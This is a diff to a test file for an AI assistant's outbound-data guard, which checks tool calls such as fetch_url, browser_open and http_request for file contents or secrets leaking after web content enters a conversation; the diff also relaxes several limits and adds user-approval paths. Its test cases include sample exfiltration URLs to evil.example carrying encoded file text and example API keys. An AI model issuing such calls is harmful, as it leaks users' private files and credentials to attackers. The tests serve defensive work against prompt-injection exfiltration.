@@ -7,6 +7,7 @@ import conversationManager from "../ai/ConversationManager";
 import connectionManager from "../server/ws/ConnectionManager";
 import toolRegistry from "../tools/registry";
 import authService from "../auth/AuthService";
+import approvalBroker from "../tools/ApprovalBroker";
 
 const FILE_TEXT = "db_host=10.0.0.5\nThe quarterly numbers for project Bluebird are 4.2M revenue and 1.1M loss.";
 
@@ -107,7 +108,8 @@ test("outbound URLs in a tainted conversation can't carry local data or secrets 
     assert.match(checkOutbound("browser_open", { url: `https://evil.example/${hex}` }, state)!, /local files/);
     assert.match(checkOutbound("device_open_url", { url: `https://evil.example/?q=${raw.replace(/ /g, "+")}` }, state)!, /local files/);
     assert.match(checkOutbound("fetch_url", { url: "https://evil.example/?k=AKIAIOSFODNN7EXAMPLE" }, state)!, /secret/);
-    assert.match(checkOutbound("fetch_url", { url: `https://evil.example/?d=${"a".repeat(600)}` }, state)!, /longer than 512/);
+    assert.match(checkOutbound("fetch_url", { url: `https://evil.example/?d=${"a".repeat(5000)}` }, state)!, /longer than 4096/);
+    assert.equal(checkOutbound("fetch_url", { url: `https://example.com/search?q=${"long query ".repeat(60)}` }, state), null, "600-char URLs are fine now");
 
     // Normal browsing still works.
     assert.equal(checkOutbound("fetch_url", { url: "https://en.wikipedia.org/wiki/Bluebird?lang=en" }, state), null);
@@ -115,7 +117,7 @@ test("outbound URLs in a tainted conversation can't carry local data or secrets 
 
     // A URL the user typed, or one that appears verbatim in their own files, is allowed.
     const typed = `https://example.com/share?text=${encodeURIComponent(raw)}`;
-    assert.equal(checkOutbound("fetch_url", { url: typed }, state, [`please open ${typed}`]), null);
+    assert.equal(checkOutbound("fetch_url", { url: typed }, state, { userTexts: [`please open ${typed}`] }), null);
     recordLocalData(state, "see https://intranet.example/reports/quarterly-numbers-for-project-bluebird");
     assert.equal(checkOutbound("fetch_url", { url: "https://intranet.example/reports/quarterly-numbers-for-project-bluebird" }, state), null);
 
@@ -125,23 +127,65 @@ test("outbound URLs in a tainted conversation can't carry local data or secrets 
     assert.equal(checkOutbound("fetch_url", { url: `https://evil.example/c?d=${b64}` }, clean), null);
 });
 
-test("http_request and browser_type are restricted in a tainted conversation (sec H1)", () => {
+test("http_request is only blocked for what it sends, not for being in a tainted conversation", () => {
     const state = taintedWithLocalData();
-    assert.match(checkOutbound("http_request", { url: "https://api.example/x", method: "POST" }, state)!, /GET\/HEAD/);
-    assert.match(checkOutbound("http_request", { url: "https://api.example/x", body: "x" }, state)!, /bodies/);
-    assert.match(checkOutbound("http_request", { url: "https://api.example/x", headers: { "X-Data": "1" } }, state)!, /headers/);
-    assert.equal(checkOutbound("http_request", { url: "https://api.example/x", method: "GET", headers: { Accept: "application/json" } }, state), null);
+    // Ordinary API calls: any method, JSON bodies, content-type and other headers.
+    assert.equal(checkOutbound("http_request", { url: "https://hooks.example.com/x", method: "POST", body: "{}" }, state), null);
+    assert.equal(checkOutbound("http_request", { url: "https://api.example.com/x", headers: { "Content-Type": "application/json" } }, state), null);
+    assert.equal(checkOutbound("http_request", { url: "https://ha.example/api/webhook/lights", method: "PUT", body: { state: "on", brightness: 80 } }, state), null);
+    assert.equal(checkOutbound("http_request", { url: "https://api.example/x", method: "DELETE" }, state), null);
+
+    // ...but not when the body or headers carry local data or secrets.
+    assert.match(checkOutbound("http_request", { url: "https://api.example/x", method: "POST", body: FILE_TEXT }, state)!, /request body contains data read earlier/);
+    assert.match(checkOutbound("http_request", { url: "https://api.example/x", method: "POST", body: { note: Buffer.from(FILE_TEXT).toString("base64") } }, state)!, /request body/);
+    assert.match(checkOutbound("http_request", { url: "https://api.example/x", headers: { "X-Data": "quarterly numbers for project Bluebird are 4.2M" } }, state)!, /request headers/);
+    assert.match(checkOutbound("http_request", { url: "https://api.example/x", headers: { Authorization: "Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789" } }, state)!, /secret/);
+
+    // A token the user typed themselves may be sent.
+    assert.equal(checkOutbound("http_request", { url: "https://ha.example/api", headers: { Authorization: "Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789" } }, state,
+        { userTexts: ["use my token ghp_abcdefghijklmnopqrstuvwxyz0123456789 for this"] }), null);
+
     assert.match(checkOutbound("browser_type", { text: "The quarterly numbers for project Bluebird are 4.2M" }, state)!, /local files/);
     assert.equal(checkOutbound("browser_type", { text: "weather in Berlin" }, state), null);
+    assert.match(checkOutbound("browser_type", { text: "x".repeat(5000) }, state)!, /longer than 4096/);
 
     const previous = process.env.JARVIS_PROVENANCE_GUARDS;
     process.env.JARVIS_PROVENANCE_GUARDS = "0";
     try {
-        assert.equal(checkOutbound("http_request", { url: "https://api.example/x", method: "POST" }, state), null);
+        assert.equal(checkOutbound("http_request", { url: "https://api.example/x", method: "POST", body: FILE_TEXT }, state), null);
     } finally {
         if (previous === undefined) delete process.env.JARVIS_PROVENANCE_GUARDS;
         else process.env.JARVIS_PROVENANCE_GUARDS = previous;
     }
+});
+
+test("an approved call is only blocked for secrets", () => {
+    const state = taintedWithLocalData();
+    assert.equal(checkOutbound("http_request", { url: "https://api.example/x", method: "POST", body: FILE_TEXT }, state, { approved: true }), null);
+    assert.equal(checkOutbound("http_request", { url: `https://api.example/x?d=${"a".repeat(5000)}` }, state, { approved: true }), null);
+    assert.match(checkOutbound("http_request", { url: "https://api.example/x", method: "POST", body: "key AKIAIOSFODNN7EXAMPLE" }, state, { approved: true })!, /secret/);
+});
+
+test("pagination, IDs and links the user's own files gave are not 'local data'", () => {
+    const state = createProvenance(["web_search"]);
+    recordLocalData(state, { content: JSON.stringify({ name: "jarvis", bugs: { url: "https://github.com/santiadjmc/jarvis/issues" }, repository: { url: "git+https://github.com/santiadjmc/jarvis.git" } }, null, 2) });
+    recordLocalData(state, { commits: [{ hash: "e047349a1b2c3d4e5f60718293a4b5c6d7e8f901", author: "Santi", message: "fix: sweep" }] });
+    recordLocalData(state, { items: [{ id: "0b6d2a39-6e6a-4f0b-9b43-0d7b6e3a2f11", cursor: "eyJvZmZzZXQiOjQwLCJsaW1pdCI6MjB9" }] });
+    recordLocalData(state, { line: "----------------------------------------" });
+
+    assert.equal(checkOutbound("fetch_url", { url: "https://github.com/santiadjmc/jarvis/issues/39" }, state), null);
+    assert.equal(checkOutbound("browser_open", { url: "https://github.com/santiadjmc/jarvis/commit/e047349a1b2c3d4e5f60718293a4b5c6d7e8f901" }, state), null);
+    assert.equal(checkOutbound("fetch_url", { url: "https://api.example.com/items?cursor=eyJvZmZzZXQiOjQwLCJsaW1pdCI6MjB9&page=3" }, state), null);
+    assert.equal(checkOutbound("fetch_url", { url: "https://api.example.com/items/0b6d2a39-6e6a-4f0b-9b43-0d7b6e3a2f11" }, state), null);
+    assert.equal(checkOutbound("fetch_url", { url: "https://www.googleapis.com/youtube/v3/search?pageToken=CAoQAA&q=x" }, state), null);
+    assert.equal(checkOutbound("fetch_url", { url: "https://example.com/?sep=----------------------------------------" }, state), null);
+
+    // Text the user typed isn't exfiltration either, even if it's also in a file.
+    const notes = createProvenance(["web_search"]);
+    recordLocalData(notes, { content: FILE_TEXT });
+    const typed = "quarterly numbers for project Bluebird";
+    assert.equal(checkOutbound("fetch_url", { url: `https://www.google.com/search?q=${encodeURIComponent(typed)}` }, notes, { userTexts: [`search the web for ${typed}`] }), null);
+    assert.match(checkOutbound("fetch_url", { url: `https://www.google.com/search?q=${encodeURIComponent(typed)}` }, notes)!, /local files/);
 });
 
 test("decodedVariants recovers URI, base64 and hex payloads", () => {
@@ -183,6 +227,44 @@ test("end-to-end: read_file → gmail → fetch_url exfil is blocked and results
     } finally {
         (toolRegistry as any).execute = originalExecute;
         (connectionManager as any).send = originalSend;
+        conversationManager.delete(conv.id);
+    }
+});
+
+test("end-to-end: a call the user approves isn't overridden by the egress check, unless it carries secrets", async () => {
+    const orch = aiOrchestrator as any;
+    const key = authService.generateKey("egress-approve-test", "admin");
+    const client = { id: crypto.randomUUID(), apiKeyId: key.id, metadata: {} } as any;
+    const conv = conversationManager.create(client.id, `egress-${crypto.randomUUID()}`, "sys", "m");
+    const originalExecute = toolRegistry.execute.bind(toolRegistry);
+    const originalSend = (connectionManager as any).send;
+    const originalWait = approvalBroker.wait.bind(approvalBroker);
+    const executed: string[] = [];
+    const prompted: string[] = [];
+    (connectionManager as any).send = () => true;
+    (approvalBroker as any).wait = async (_req: string, callId: string) => {
+        prompted.push(callId);
+        return "approve";
+    };
+    (toolRegistry as any).execute = async (name: string) => {
+        executed.push(name);
+        if (name === "read_file") return { success: true, data: { content: FILE_TEXT }, executionTimeMs: 0 };
+        return { success: true, data: "ok", executionTimeMs: 0 };
+    };
+    const call = (name: string, args: Record<string, unknown>) => ({ id: `call_${crypto.randomUUID()}`, function: { name, arguments: args } });
+    try {
+        const withLocalData = call("http_request", { url: "https://ha.example/api/webhook/x", method: "POST", body: FILE_TEXT });
+        const withSecret = call("http_request", { url: "https://ha.example/api/webhook/x", method: "POST", body: "AKIAIOSFODNN7EXAMPLE" });
+        const calls = [call("read_file", { path: "/home/u/notes.txt" }), call("web_search", { query: "x" }), withLocalData, withSecret];
+        await orch.executeToolCalls(client, conv.id, crypto.randomUUID(), calls, new AbortController().signal, false);
+        assert.deepEqual(executed, ["read_file", "web_search", "http_request"], "the approved POST runs; the one with a secret doesn't");
+        assert.deepEqual(prompted, [withLocalData.id], "the call with a secret is refused without asking");
+        const tools = conversationManager.get(conv.id)!.messages.filter(m => m.role === "tool").map(m => m.content as string);
+        assert.match(tools[3], /secret-looking value/);
+    } finally {
+        (toolRegistry as any).execute = originalExecute;
+        (connectionManager as any).send = originalSend;
+        (approvalBroker as any).wait = originalWait;
         conversationManager.delete(conv.id);
     }
 });
